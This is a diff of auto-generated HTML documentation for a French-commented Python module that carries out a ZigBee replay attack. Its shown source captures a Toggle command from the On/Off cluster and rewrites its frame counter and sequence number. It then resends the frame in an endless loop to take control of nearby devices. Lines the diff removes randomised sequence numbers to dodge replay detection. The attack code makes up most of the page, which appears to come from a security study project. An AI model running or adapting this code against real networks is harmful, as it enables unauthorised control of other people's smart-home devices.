@@ -5,7 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
 <meta name="generator" content="pdoc3 0.11.5">
 <title>scripts.replay API documentation</title>
-<meta name="description" content="Attaque de replay sur le réseau ZigBee …">
+<meta name="description" content="Module : zigbee_replay_attack
+…">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/sanitize.min.css" integrity="sha512-y1dtMcuvtTMJc1yPgEqF0ZjQbhnc/bFhyvIyVNb9Zk5mIGtqVaAB1Ttl28su8AvFMOY0EwRbAe+HCLqj6W7/KA==" crossorigin>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/typography.min.css" integrity="sha512-Y1DYSb995BAfxobCkKepB1BqJJTPrOp3zPL74AWFugHHmmdcvO+C48WLrUOlhGMc0QG7AE3f7gmvvcrmX2fDoA==" crossorigin>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css" crossorigin>
@@ -36,11 +37,16 @@ el.replaceWith(d);
 <h1 class="title">Module <code>scripts.replay</code></h1>
 </header>
 <section id="section-intro">
-<p>Attaque de replay sur le réseau ZigBee.</p>
-<p>Ce module implémente une attaque de replay sur le réseau ZigBee. Il permet de
-capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer
-sur le réseau ZigBee. Il gère également les mécanismes de protection contre les
-attaques de type replay et permet de personnaliser la configuration de l'attaque.</p>
+<h1 id="module-zigbee_replay_attack">Module : zigbee_replay_attack</h1>
+<p>Ce module implémente une attaque de replay sur le réseau ZigBee.</p>
+<p>Il permet de capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer sur le réseau ZigBee.
+Il gère également les mécanismes de protection contre les attaques de type replay et permet de personnaliser la configuration de l'attaque.</p>
+<h2 id="classes">Classes</h2>
+<p>ZigbeeReplayAttack: Classe principale pour effectuer l'attaque de replay.</p>
+<p>Exemple d'utilisation:
+&gt;&gt;&gt; from zigbee_replay_attack import ZigbeeReplayAttack
+&gt;&gt;&gt; attaque = ZigbeeReplayAttack(serial_port='/dev/ttyUSB0', aes_key='ma_cle_aes')
+&gt;&gt;&gt; attaque.lancer_attaque_replay(capture_live=True)</p>
 </section>
 <section>
 </section>
@@ -63,12 +69,25 @@ attaques de type replay et permet de personnaliser la configuration de l'attaque
 <pre><code class="python">class ZigbeeReplayAttack:
     &#34;&#34;&#34;
     Classe pour effectuer une attaque de replay sur le réseau ZigBee.
-    
-    Cette classe permet de capturer des trames ZigBee, de les analyser, 
-    de les modifier (par exemple, en modifiant les numéros de séquence) 
-    et de les rejouer sur le réseau ZigBee. Elle gère également les 
-    mécanismes de protection contre les attaques de type replay et permet 
-    de personnaliser la configuration de l&#39;attaque.
+
+    Cette classe permet de :
+        - Capturer des trames ZigBee en direct ou depuis un fichier.
+        - Analyser et filtrer les trames capturées.
+        - Modifier certains paramètres (comme le numéro de séquence ou le compteur de trame).
+        - Rejouer les trames modifiées sur le réseau ZigBee de façon répétée.
+
+    Attributs:
+        capture_file (str): Nom du fichier de capture des trames (par défaut &#39;captures_zigbee.json&#39;).
+        channel (int): Canal ZigBee utilisé pour l&#39;attaque (par défaut 13).
+        pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
+        serial_port (Optional[str]): Port série pour l&#39;envoi des trames.
+        aes_key (Optional[str]): Clé AES pour la sécurité des trames, si nécessaire.
+        codeur (CodeurTrameZigbee): Instance de l&#39;encodeur de trame ZigBee.
+        decodeur (DecodeurTrameZigbee): Instance du décodeur de trame ZigBee.
+        sniffer (SniffeurZigbee): Instance pour la capture des trames.
+        framefinder (ZigbeeFrameFinder): Instance pour la gestion du compteur de trame.
+        captures (list): Liste des trames capturées.
+        replay_queue (queue.Queue): File d&#39;attente pour la gestion des trames à rejouer.
     &#34;&#34;&#34;
 
     def __init__(
@@ -82,20 +101,12 @@ attaques de type replay et permet de personnaliser la configuration de l'attaque
         &#34;&#34;&#34;
         Initialise l&#39;attaque de replay ZigBee.
 
-        Parameters
-        ----------
-        capture_file : str, optional
-            Nom du fichier de capture pour stocker les trames ZigBee capturées.
-            Par défaut &#39;captures_zigbee.json&#39;.
-        channel : int, optional
-            Canal ZigBee sur lequel l&#39;attaque de replay sera effectuée.
-            Par défaut 13.
-        pan_id : int, optional
-            PAN ID du réseau ZigBee. Par défaut 0x1900.
-        serial_port : str, optional
-            Port série utilisé pour envoyer les trames de replay.
-        aes_key : str, optional
-            Clé AES pour la sécurité des trames, si applicable.
+        Paramètres:
+            capture_file (str): Nom du fichier de capture (par défaut &#39;captures_zigbee.json&#39;).
+            channel (int): Canal ZigBee (par défaut 13).
+            pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
+            serial_port (Optional[str]): Port série pour l&#39;envoi des trames.
+            aes_key (Optional[str]): Clé AES pour la sécurité des trames, si applicable.
         &#34;&#34;&#34;
         self.capture_file = capture_file
         self.channel = channel
@@ -103,7 +114,6 @@ attaques de type replay et permet de personnaliser la configuration de l'attaque
         self.serial_port = serial_port
         self.aes_key = aes_key
         
-        # Initialisation des classes auxiliaires
         self.codeur = CodeurTrameZigbee(logger)
         self.decodeur = DecodeurTrameZigbee(logger)
         self.sniffer = SniffeurZigbee(
@@ -111,508 +121,347 @@ attaques de type replay et permet de personnaliser la configuration de l'attaque
             fichier_sortie=capture_file,
             vitesse_bauds=115200
         )
-        
-        # Gestion des séquences et anti-replay
-        self.sequence_base = None
-        self.sequence_offset = 0
+        self.framefinder = ZigbeeFrameFinder()
         self.captures = []
         self.replay_queue = queue.Queue()
-        self.sequence_variations = []
 
-    def capturer_trames_live(self, duree_capture: int = 10):
+    def attendre_trame_data(self, timeout: int = 30) -&gt; Optional[str]:
         &#34;&#34;&#34;
-        Capture live des trames ZigBee pendant une durée spécifiée.
+        Capture en direct une trame ZigBee de type Data correspondant au toggle.
 
-        Parameters
-        ----------
-        duree_capture : int, optional
-            Durée de la capture en secondes. Par défaut 10.
+        La fonction démarre le sniffer et attend qu&#39;une trame de type &#39;Data&#39;
+        provenant du cluster 0600 avec un command_id égal à &#39;02&#39; et une longueur de trame inférieure à 100
+        soit capturée. Une fois la trame correspondante trouvée, elle est décodée et renvoyée.
+
+        Paramètres:
+            timeout (int): Durée maximale d&#39;attente en secondes (par défaut 30).
+
+        Retourne:
+            Optional[str]: La trame ZigBee capturée sous forme de chaîne hexadécimale, ou None si aucune trame n&#39;est trouvée.
         &#34;&#34;&#34;
-        logger.info(f&#34;Démarrage de la capture live pour {duree_capture} secondes&#34;)
+        self.sniffer.reinitialiser() 
+        logger.info(&#34;Attente d&#39;une trame Toggle...&#34;)
         self.sniffer.demarrer_sniffer()
-        time.sleep(duree_capture)
+        
+        start_time = time.time()
+        while time.time() - start_time &lt; timeout:
+            if self.sniffer.captures:
+                for capture in self.sniffer.captures:
+                    try:
+                        # Filtrage de la trame selon le type, le cluster, le command_id et la taille
+                        if (capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and
+                            capture.get(&#39;couche_aps&#39;, {}).get(&#39;cluster_id&#39;, &#39;&#39;).lower() == &#39;0600&#39; and
+                            capture.get(&#39;couche_zcl&#39;, {}).get(&#39;command_id&#39;, &#39;&#39;).lower() == &#39;02&#39;) and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 100:
+                            
+                            hex_data = capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]
+                            
+                            # Décodage de la trame pour affichage (facultatif)
+                            decode = DecodeurTrameZigbee()
+                            octets = bytes.fromhex(hex_data)
+                            print(decode.decoder_trame_data(octets))
+                            
+                            logger.info(&#34;Trame Toggle détectée&#34;)
+                            
+                            self.sniffer.arreter_sniffer()
+                            self.sniffer.reinitialiser()
+                            return hex_data
+                        else:
+                            # Afficher la trame si elle n&#39;est pas conforme aux critères et la supprimer
+                            if capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 95:
+                                print(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;])
+                            self.sniffer.captures.remove(capture)
+                    except KeyError:
+                        continue
+            time.sleep(0.1)
+            
         self.sniffer.arreter_sniffer()
-        self.sniffer.sauvegarder_captures()
-        self.captures = self.sniffer.captures
-        logger.info(f&#34;Capture terminée : {len(self.captures)} trames capturées&#34;)
+        logger.error(&#34;Timeout: Aucune trame Toggle trouvée&#34;)
+        return None
 
-    def charger_captures(self):
+    def envoyer_trames_en_boucle(self):
         &#34;&#34;&#34;
-        Charge et analyse les captures ZigBee à partir d&#39;un fichier JSON.
+        Envoie en boucle des trames de replay sur le réseau ZigBee.
 
-        Cette méthode lit le fichier de captures spécifié lors de l&#39;initialisation
-        et décode chaque trame pour préparer l&#39;attaque de replay.
-        &#34;&#34;&#34;
-        try:
-            with open(self.capture_file, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
-                raw_captures = json.load(f)
-                
-            # Décoder chaque trame capturée
-            self.captures = []
-            for capture in raw_captures:
-                if isinstance(capture, str):  # Si c&#39;est une chaîne hex
-                    trame_bytes = bytes.fromhex(capture)
-                    trame_decodee = self.decodeur.decoder_trame_zigbee(trame_bytes)
-                    if trame_decodee:
-                        self.captures.append(trame_decodee)
-                else:  # Si c&#39;est déjà un dictionnaire décodé
-                    self.captures.append(capture)
-            
-            # Extraire les séquences
-            self._extraire_sequences()
-            logger.info(f&#34;Chargement réussi : {len(self.captures)} trames&#34;)
-            
-        except Exception as e:
-            logger.error(f&#34;Erreur lors du chargement des captures : {e}&#34;)
-            self.captures = []
+        La fonction récupère d&#39;abord une trame initiale (en attente d&#39;une trame Toggle)
+        puis, en utilisant la classe ZigbeeFrameFinder, elle incrémente le compteur de trame
+        et le numéro de séquence avant de réenvoyer la trame modifiée sur le port série.
 
-    def _extraire_sequences(self):
+        Remarque:
+            La trame initiale est tronquée de ses 4 derniers octets avant d&#39;être traitée.
         &#34;&#34;&#34;
-        Extrait les numéros de séquence des trames capturées.
-
-        Cette méthode privée analyse les trames capturées pour extraire
-        les numéros de séquence et initialiser la séquence de base.
-        &#34;&#34;&#34;
-        sequences = []
-        for capture in self.captures:
-            if capture[&#39;type_trame&#39;] == &#39;Data&#39;:
-                seq = capture[&#39;couche_mac&#39;].get(&#39;numero_sequence&#39;)
-                if seq is not None:
-                    sequences.append(seq)
-            elif &#39;sequence_number&#39; in capture:
-                sequences.append(capture[&#39;sequence_number&#39;])
-                
-        if sequences:
-            self.sequence_base = min(sequences)
-            self._generer_variations_sequence()
-
-    def _generer_variations_sequence(self):
-        &#34;&#34;&#34;
-        Génère des variations de numéro de séquence basées sur la séquence de base.
-
-        Cette méthode privée crée différentes variations des numéros de séquence
-        pour éviter la détection des attaques de replay.
-        &#34;&#34;&#34;
-        if not self.sequence_base:
+        trame_initiale = self.attendre_trame_data() #&#34;6188f2eff4ffff00004818ffff00001e19a13260feffbd4d742f3c60feffbd4d74400a060004010152010202&#34;#
+        if not trame_initiale:
             return
         
-        variations = [
-            self.sequence_base,
-            (self.sequence_base + 1) % 256,
-            (self.sequence_base + random.randint(2, 10)) % 256,
-            self._generer_sequence_cryptographique()
-        ]
+        # Suppression des 4 derniers octets de la trame initiale
+        trame_initiale = trame_initiale[:-4]
+        print(&#34;Trame initiale : &#34;, trame_initiale)
         
-        self.sequence_variations = variations
-        logger.debug(f&#34;Variations de séquence générées : {self.sequence_variations}&#34;)
-
-    def _generer_sequence_cryptographique(self) -&gt; int:
-        &#34;&#34;&#34;
-        Génère un numéro de séquence cryptographiquement sûr.
-
-        Returns
-        -------
-        int
-            Numéro de séquence généré de manière cryptographique.
-        &#34;&#34;&#34;
-        seed = hashlib.sha256(
-            str(self.sequence_base).encode() + 
-            str(time.time()).encode()
-        ).digest()
-        return int.from_bytes(seed[:1], byteorder=&#39;big&#39;)
-
-    def preparer_trame_replay(self, trame_originale: dict) -&gt; bytes:
-        &#34;&#34;&#34;
-        Prépare une trame pour le replay en modifiant le numéro de séquence.
-
-        Parameters
-        ----------
-        trame_originale : dict
-            Trame ZigBee originale à modifier.
-
-        Returns
-        -------
-        bytes
-            Trame prête à être envoyée en replay.
-        &#34;&#34;&#34;
-        sequence = random.choice(self.sequence_variations) if self.sequence_variations else random.randint(0, 255)
-        
-        # Modifier la séquence dans la trame
-        if trame_originale[&#39;type_trame&#39;] == &#39;Data&#39;:
-            trame_originale[&#39;couche_mac&#39;][&#39;numero_sequence&#39;] = sequence
-            trame_originale[&#39;couche_reseau&#39;][&#39;sequence_number&#39;] = sequence
-        else:
-            trame_originale[&#39;sequence_number&#39;] = sequence
-            
-        # Encoder la trame modifiée
-        return self.codeur.encoder_trame_zigbee(trame_originale)
-
-    def preparer_trames_replay(self, nombre_trames: int = 20):
-        &#34;&#34;&#34;
-        Prépare plusieurs trames pour le replay.
-
-        Parameters
-        ----------
-        nombre_trames : int, optional
-            Nombre de trames à préparer pour le replay. Par défaut 20.
-        &#34;&#34;&#34;
-        self.replay_queue = queue.Queue()
-        
-        for _ in range(nombre_trames):
-            if not self.captures:
-                continue
-
-            trame_originale = random.choice(self.captures)
-            trame_modifiee = self.preparer_trame_replay(trame_originale)
-            self.replay_queue.put(trame_modifiee)
-
-    def envoyer_trames_replay(self, nombre_replays: int = 5):
-        &#34;&#34;&#34;
-        Envoie les trames de replay via le port série.
-
-        Parameters
-        ----------
-        nombre_replays : int, optional
-            Nombre de fois que chaque trame sera envoyée. Par défaut 5.
-        &#34;&#34;&#34;
         try:
             with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
-                logger.info(f&#34;Début du replay via {self.serial_port}&#34;)
+                logger.info(f&#34;Début de l&#39;envoi sur {self.serial_port}&#34;)
                 
-                while not self.replay_queue.empty():
-                    trame = self.replay_queue.get()
-                    
-                    for _ in range(nombre_replays):
-                        # Construction de la trame complète avec en-tête
-                        trame_complete = bytearray([
-                            len(trame) + 3,  # Longueur
-                            self.channel,    # Canal
-                            self.pan_id &gt;&gt; 8,  # PAN ID (octet haut)
-                            self.pan_id &amp; 0xFF  # PAN ID (octet bas)
-                        ])
-                        trame_complete.extend(trame)
-                        
-                        # Envoi avec délai aléatoire
-                        ser.write(trame_complete)
-                        time.sleep(random.uniform(0.1, 0.5))
-                        
-                        logger.debug(f&#34;Trame replay envoyée - Longueur: {len(trame_complete)}&#34;)
-                        
-        except Exception as e:
-            logger.error(f&#34;Erreur durant le replay : {e}&#34;)
+                # Modification de la trame en incrémentant le compteur de trame
+                trame_modifiee = self.framefinder.increment_frame_counter(trame_initiale)
+                print(&#34;Trame modifiée : &#34;, trame_modifiee)
+                trame_bytes = bytes.fromhex(trame_modifiee)
 
-    def lancer_attaque_replay(self, nombre_replays: int = 5, capture_live: bool = False):
+                # Envoi en boucle de la trame modifiée
+                while True:
+                    try:
+                        # Préfixe de trame (&#39;61&#39;) ajouté à la trame modifiée
+                        ser.write(bytes.fromhex(&#39;61&#39;) + trame_bytes)
+                        logger.debug(f&#34;Trame envoyée : {trame_bytes.hex()}&#34;)
+                        time.sleep(3) 
+                        print(&#34;Trame envoyée : &#34;, trame_bytes.hex())
+                        
+                        # Incrémentation du compteur de trame et du numéro de séquence pour la prochaine itération
+                        trame_modifiee = self.framefinder.increment_frame_counter(trame_bytes.hex(), increment=1)
+                        trame_modifiee = self.framefinder.increment_sequence_number(trame_modifiee, increment=1)
+
+                        trame_bytes = bytes.fromhex(trame_modifiee)
+                        print(&#34;Trame modifiée (extrait compteur) : &#34;, trame_bytes.hex()[-8:-6])
+                        
+                    except Exception as e:
+                        logger.error(f&#34;Erreur d&#39;envoi : {e}&#34;)
+                        break
+        except serial.SerialException as e:
+            logger.error(f&#34;Erreur port série : {e}&#34;)
+
+    def lancer_attaque_replay(self, capture_live: bool = True):
         &#34;&#34;&#34;
-        Lance l&#39;attaque de replay complète avec capture et envoi des trames.
+        Lance l&#39;attaque de replay sur le réseau ZigBee.
 
-        Parameters
-        ----------
-        nombre_replays : int, optional
-            Nombre de fois que chaque trame sera envoyée. Par défaut 5.
-        capture_live : bool, optional
-            Si True, effectue une capture live des trames ZigBee. Par défaut False.
+        Selon le paramètre capture_live, la fonction capture en direct les trames ou
+        utilise un fichier de capture existant. Elle démarre ensuite un thread qui
+        exécute l&#39;envoi en boucle des trames de replay.
+
+        Paramètres:
+            capture_live (bool): Si True, la capture en direct est activée; sinon, le fichier de capture est utilisé. Par défaut True.
+
+        Exceptions:
+            Toute exception survenue lors de l&#39;exécution de l&#39;attaque est logguée.
         &#34;&#34;&#34;
         try:
             if capture_live:
-                self.capturer_trames_live()
+                logger.info(&#34;Mode capture live activé&#34;)
             else:
-                self.charger_captures()
-                
-            if not self.captures:
-                logger.error(&#34;Aucune trame à rejouer&#34;)
-                return
-                
-            self.preparer_trames_replay()
-            
-            # Lancement du replay dans un thread séparé
-            thread_replay = threading.Thread(
-                target=self.envoyer_trames_replay, 
-                kwargs={&#39;nombre_replays&#39;: nombre_replays}
-            )
+                with open(self.capture_file, &#39;r&#39;) as f:
+                    self.captures = json.load(f)
+
+            thread_replay = threading.Thread(target=self.envoyer_trames_en_boucle)
             thread_replay.start()
             thread_replay.join()
-            
+
         except Exception as e:
-            logger.error(f&#34;Échec de l&#39;attaque de replay : {e}&#34;)</code></pre>
+            logger.error(f&#34;Échec de l&#39;attaque : {e}&#34;)</code></pre>
 </details>
 <div class="desc"><p>Classe pour effectuer une attaque de replay sur le réseau ZigBee.</p>
-<p>Cette classe permet de capturer des trames ZigBee, de les analyser,
-de les modifier (par exemple, en modifiant les numéros de séquence)
-et de les rejouer sur le réseau ZigBee. Elle gère également les
-mécanismes de protection contre les attaques de type replay et permet
-de personnaliser la configuration de l'attaque.</p>
+<p>Cette classe permet de :
+- Capturer des trames ZigBee en direct ou depuis un fichier.
+- Analyser et filtrer les trames capturées.
+- Modifier certains paramètres (comme le numéro de séquence ou le compteur de trame).
+- Rejouer les trames modifiées sur le réseau ZigBee de façon répétée.</p>
+<h2 id="attributs">Attributs</h2>
+<p>capture_file (str): Nom du fichier de capture des trames (par défaut 'captures_zigbee.json').
+channel (int): Canal ZigBee utilisé pour l'attaque (par défaut 13).
+pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
+serial_port (Optional[str]): Port série pour l'envoi des trames.
+aes_key (Optional[str]): Clé AES pour la sécurité des trames, si nécessaire.
+codeur (CodeurTrameZigbee): Instance de l'encodeur de trame ZigBee.
+decodeur (DecodeurTrameZigbee): Instance du décodeur de trame ZigBee.
+sniffer (SniffeurZigbee): Instance pour la capture des trames.
+framefinder (ZigbeeFrameFinder): Instance pour la gestion du compteur de trame.
+captures (list): Liste des trames capturées.
+replay_queue (queue.Queue): File d'attente pour la gestion des trames à rejouer.</p>
 <p>Initialise l'attaque de replay ZigBee.</p>
-<h2 id="parameters">Parameters</h2>
-<dl>
-<dt><strong><code>capture_file</code></strong> :&ensp;<code>str</code>, optional</dt>
-<dd>Nom du fichier de capture pour stocker les trames ZigBee capturées.
-Par défaut 'captures_zigbee.json'.</dd>
-<dt><strong><code>channel</code></strong> :&ensp;<code>int</code>, optional</dt>
-<dd>Canal ZigBee sur lequel l'attaque de replay sera effectuée.
-Par défaut 13.</dd>
-<dt><strong><code>pan_id</code></strong> :&ensp;<code>int</code>, optional</dt>
-<dd>PAN ID du réseau ZigBee. Par défaut 0x1900.</dd>
-<dt><strong><code>serial_port</code></strong> :&ensp;<code>str</code>, optional</dt>
-<dd>Port série utilisé pour envoyer les trames de replay.</dd>
-<dt><strong><code>aes_key</code></strong> :&ensp;<code>str</code>, optional</dt>
-<dd>Clé AES pour la sécurité des trames, si applicable.</dd>
-</dl></div>
+<h2 id="parametres">Paramètres</h2>
+<p>capture_file (str): Nom du fichier de capture (par défaut 'captures_zigbee.json').
+channel (int): Canal ZigBee (par défaut 13).
+pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
+serial_port (Optional[str]): Port série pour l'envoi des trames.
+aes_key (Optional[str]): Clé AES pour la sécurité des trames, si applicable.</p></div>
 <h3>Methods</h3>
 <dl>
-<dt id="scripts.replay.ZigbeeReplayAttack.capturer_trames_live"><code class="name flex">
-<span>def <span class="ident">capturer_trames_live</span></span>(<span>self, duree_capture: int = 10)</span>
+<dt id="scripts.replay.ZigbeeReplayAttack.attendre_trame_data"><code class="name flex">
+<span>def <span class="ident">attendre_trame_data</span></span>(<span>self, timeout: int = 30) ‑> str | None</span>
 </code></dt>
 <dd>
 <details class="source">
 <summary>
 <span>Expand source code</span>
 </summary>
-<pre><code class="python">def capturer_trames_live(self, duree_capture: int = 10):
+<pre><code class="python">def attendre_trame_data(self, timeout: int = 30) -&gt; Optional[str]:
     &#34;&#34;&#34;
-    Capture live des trames ZigBee pendant une durée spécifiée.
+    Capture en direct une trame ZigBee de type Data correspondant au toggle.
 
-    Parameters
-    ----------
-    duree_capture : int, optional
-        Durée de la capture en secondes. Par défaut 10.
+    La fonction démarre le sniffer et attend qu&#39;une trame de type &#39;Data&#39;
+    provenant du cluster 0600 avec un command_id égal à &#39;02&#39; et une longueur de trame inférieure à 100
+    soit capturée. Une fois la trame correspondante trouvée, elle est décodée et renvoyée.
+
+    Paramètres:
+        timeout (int): Durée maximale d&#39;attente en secondes (par défaut 30).
+
+    Retourne:
+        Optional[str]: La trame ZigBee capturée sous forme de chaîne hexadécimale, ou None si aucune trame n&#39;est trouvée.
     &#34;&#34;&#34;
-    logger.info(f&#34;Démarrage de la capture live pour {duree_capture} secondes&#34;)
+    self.sniffer.reinitialiser() 
+    logger.info(&#34;Attente d&#39;une trame Toggle...&#34;)
     self.sniffer.demarrer_sniffer()
-    time.sleep(duree_capture)
+    
+    start_time = time.time()
+    while time.time() - start_time &lt; timeout:
+        if self.sniffer.captures:
+            for capture in self.sniffer.captures:
+                try:
+                    # Filtrage de la trame selon le type, le cluster, le command_id et la taille
+                    if (capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and
+                        capture.get(&#39;couche_aps&#39;, {}).get(&#39;cluster_id&#39;, &#39;&#39;).lower() == &#39;0600&#39; and
+                        capture.get(&#39;couche_zcl&#39;, {}).get(&#39;command_id&#39;, &#39;&#39;).lower() == &#39;02&#39;) and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 100:
+                        
+                        hex_data = capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]
+                        
+                        # Décodage de la trame pour affichage (facultatif)
+                        decode = DecodeurTrameZigbee()
+                        octets = bytes.fromhex(hex_data)
+                        print(decode.decoder_trame_data(octets))
+                        
+                        logger.info(&#34;Trame Toggle détectée&#34;)
+                        
+                        self.sniffer.arreter_sniffer()
+                        self.sniffer.reinitialiser()
+                        return hex_data
+                    else:
+                        # Afficher la trame si elle n&#39;est pas conforme aux critères et la supprimer
+                        if capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 95:
+                            print(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;])
+                        self.sniffer.captures.remove(capture)
+                except KeyError:
+                    continue
+        time.sleep(0.1)
+        
     self.sniffer.arreter_sniffer()
-    self.sniffer.sauvegarder_captures()
-    self.captures = self.sniffer.captures
-    logger.info(f&#34;Capture terminée : {len(self.captures)} trames capturées&#34;)</code></pre>
+    logger.error(&#34;Timeout: Aucune trame Toggle trouvée&#34;)
+    return None</code></pre>
 </details>
-<div class="desc"><p>Capture live des trames ZigBee pendant une durée spécifiée.</p>
-<h2 id="parameters">Parameters</h2>
-<dl>
-<dt><strong><code>duree_capture</code></strong> :&ensp;<code>int</code>, optional</dt>
-<dd>Durée de la capture en secondes. Par défaut 10.</dd>
-</dl></div>
+<div class="desc"><p>Capture en direct une trame ZigBee de type Data correspondant au toggle.</p>
+<p>La fonction démarre le sniffer et attend qu'une trame de type 'Data'
+provenant du cluster 0600 avec un command_id égal à '02' et une longueur de trame inférieure à 100
+soit capturée. Une fois la trame correspondante trouvée, elle est décodée et renvoyée.</p>
+<h2 id="parametres">Paramètres</h2>
+<p>timeout (int): Durée maximale d'attente en secondes (par défaut 30).</p>
+<h2 id="retourne">Retourne</h2>
+<p>Optional[str]: La trame ZigBee capturée sous forme de chaîne hexadécimale, ou None si aucune trame n'est trouvée.</p></div>
 </dd>
-<dt id="scripts.replay.ZigbeeReplayAttack.charger_captures"><code class="name flex">
-<span>def <span class="ident">charger_captures</span></span>(<span>self)</span>
+<dt id="scripts.replay.ZigbeeReplayAttack.envoyer_trames_en_boucle"><code class="name flex">
+<span>def <span class="ident">envoyer_trames_en_boucle</span></span>(<span>self)</span>
 </code></dt>
 <dd>
 <details class="source">
 <summary>
 <span>Expand source code</span>
 </summary>
-<pre><code class="python">def charger_captures(self):
+<pre><code class="python">def envoyer_trames_en_boucle(self):
     &#34;&#34;&#34;
-    Charge et analyse les captures ZigBee à partir d&#39;un fichier JSON.
+    Envoie en boucle des trames de replay sur le réseau ZigBee.
 
-    Cette méthode lit le fichier de captures spécifié lors de l&#39;initialisation
-    et décode chaque trame pour préparer l&#39;attaque de replay.
-    &#34;&#34;&#34;
-    try:
-        with open(self.capture_file, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
-            raw_captures = json.load(f)
-            
-        # Décoder chaque trame capturée
-        self.captures = []
-        for capture in raw_captures:
-            if isinstance(capture, str):  # Si c&#39;est une chaîne hex
-                trame_bytes = bytes.fromhex(capture)
-                trame_decodee = self.decodeur.decoder_trame_zigbee(trame_bytes)
-                if trame_decodee:
-                    self.captures.append(trame_decodee)
-            else:  # Si c&#39;est déjà un dictionnaire décodé
-                self.captures.append(capture)
-        
-        # Extraire les séquences
-        self._extraire_sequences()
-        logger.info(f&#34;Chargement réussi : {len(self.captures)} trames&#34;)
-        
-    except Exception as e:
-        logger.error(f&#34;Erreur lors du chargement des captures : {e}&#34;)
-        self.captures = []</code></pre>
-</details>
-<div class="desc"><p>Charge et analyse les captures ZigBee à partir d'un fichier JSON.</p>
-<p>Cette méthode lit le fichier de captures spécifié lors de l'initialisation
-et décode chaque trame pour préparer l'attaque de replay.</p></div>
-</dd>
-<dt id="scripts.replay.ZigbeeReplayAttack.envoyer_trames_replay"><code class="name flex">
-<span>def <span class="ident">envoyer_trames_replay</span></span>(<span>self, nombre_replays: int = 5)</span>
-</code></dt>
-<dd>
-<details class="source">
-<summary>
-<span>Expand source code</span>
-</summary>
-<pre><code class="python">def envoyer_trames_replay(self, nombre_replays: int = 5):
-    &#34;&#34;&#34;
-    Envoie les trames de replay via le port série.
+    La fonction récupère d&#39;abord une trame initiale (en attente d&#39;une trame Toggle)
+    puis, en utilisant la classe ZigbeeFrameFinder, elle incrémente le compteur de trame
+    et le numéro de séquence avant de réenvoyer la trame modifiée sur le port série.
 
-    Parameters
-    ----------
-    nombre_replays : int, optional
-        Nombre de fois que chaque trame sera envoyée. Par défaut 5.
+    Remarque:
+        La trame initiale est tronquée de ses 4 derniers octets avant d&#39;être traitée.
     &#34;&#34;&#34;
+    trame_initiale = self.attendre_trame_data() #&#34;6188f2eff4ffff00004818ffff00001e19a13260feffbd4d742f3c60feffbd4d74400a060004010152010202&#34;#
+    if not trame_initiale:
+        return
+    
+    # Suppression des 4 derniers octets de la trame initiale
+    trame_initiale = trame_initiale[:-4]
+    print(&#34;Trame initiale : &#34;, trame_initiale)
+    
     try:
         with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
-            logger.info(f&#34;Début du replay via {self.serial_port}&#34;)
+            logger.info(f&#34;Début de l&#39;envoi sur {self.serial_port}&#34;)
             
-            while not self.replay_queue.empty():
-                trame = self.replay_queue.get()
-                
-                for _ in range(nombre_replays):
-                    # Construction de la trame complète avec en-tête
-                    trame_complete = bytearray([
-                        len(trame) + 3,  # Longueur
-                        self.channel,    # Canal
-                        self.pan_id &gt;&gt; 8,  # PAN ID (octet haut)
-                        self.pan_id &amp; 0xFF  # PAN ID (octet bas)
-                    ])
-                    trame_complete.extend(trame)
+            # Modification de la trame en incrémentant le compteur de trame
+            trame_modifiee = self.framefinder.increment_frame_counter(trame_initiale)
+            print(&#34;Trame modifiée : &#34;, trame_modifiee)
+            trame_bytes = bytes.fromhex(trame_modifiee)
+
+            # Envoi en boucle de la trame modifiée
+            while True:
+                try:
+                    # Préfixe de trame (&#39;61&#39;) ajouté à la trame modifiée
+                    ser.write(bytes.fromhex(&#39;61&#39;) + trame_bytes)
+                    logger.debug(f&#34;Trame envoyée : {trame_bytes.hex()}&#34;)
+                    time.sleep(3) 
+                    print(&#34;Trame envoyée : &#34;, trame_bytes.hex())
                     
-                    # Envoi avec délai aléatoire
-                    ser.write(trame_complete)
-                    time.sleep(random.uniform(0.1, 0.5))
+                    # Incrémentation du compteur de trame et du numéro de séquence pour la prochaine itération
+                    trame_modifiee = self.framefinder.increment_frame_counter(trame_bytes.hex(), increment=1)
+                    trame_modifiee = self.framefinder.increment_sequence_number(trame_modifiee, increment=1)
+
+                    trame_bytes = bytes.fromhex(trame_modifiee)
+                    print(&#34;Trame modifiée (extrait compteur) : &#34;, trame_bytes.hex()[-8:-6])
                     
-                    logger.debug(f&#34;Trame replay envoyée - Longueur: {len(trame_complete)}&#34;)
-                    
-    except Exception as e:
-        logger.error(f&#34;Erreur durant le replay : {e}&#34;)</code></pre>
+                except Exception as e:
+                    logger.error(f&#34;Erreur d&#39;envoi : {e}&#34;)
+                    break
+    except serial.SerialException as e:
+        logger.error(f&#34;Erreur port série : {e}&#34;)</code></pre>
 </details>
-<div class="desc"><p>Envoie les trames de replay via le port série.</p>
-<h2 id="parameters">Parameters</h2>
-<dl>
